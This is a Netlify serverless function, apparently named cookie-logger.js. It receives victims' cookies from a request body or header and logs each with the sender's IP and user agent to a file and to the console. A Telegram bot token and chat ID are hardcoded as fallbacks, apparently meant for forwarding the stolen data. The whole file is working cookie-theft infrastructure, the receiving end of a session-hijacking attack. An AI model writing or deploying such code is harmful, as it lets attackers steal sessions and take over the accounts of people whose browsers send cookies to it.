const https = require('https');

// For production, move these to Netlify Environment Variables in the dashboard.
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '8569746095';

// netlify/functions/cookie-logger.js
exports.handler = async (event, context) => {
  const fs = require('fs');
  
  // 1. Get Data
  let cookies = '';
  let ip = event.headers['x-forwarded-for'] || 'Unknown';
  let ua = event.headers['user-agent'] || 'Unknown';
  
  // Check if cookies were sent as a JSON body (Better method)
  if (event.body) {
    try {
      const parsed = JSON.parse(event.body);
      cookies = parsed.cookies || '(No cookies in body)';
    } catch (e) {
      cookies = event.body;
    }
  } else {
    // Fallback to header if no body
    cookies = event.headers.cookie || '(No cookies in header)';
  }

  // 2. Format for readability
  const timestamp = new Date().toISOString();
  const logEntry = `
[${timestamp}] 
IP: ${ip}
UA: ${ua}
---
COOKIES:
${cookies}
---

  `.trim();

  // 3. Write to file (Persisted in /tmp for this function's lifetime)
  const logPath = '/tmp/log.txt';
  try {
    fs.appendFileSync(logPath, logEntry);
    
    // Optional: Log to Netlify's dashboard logs too
    console.log("Cookie logged successfully:", cookies.substring(0, 50) + '...');

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: 'Cookies logged' })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
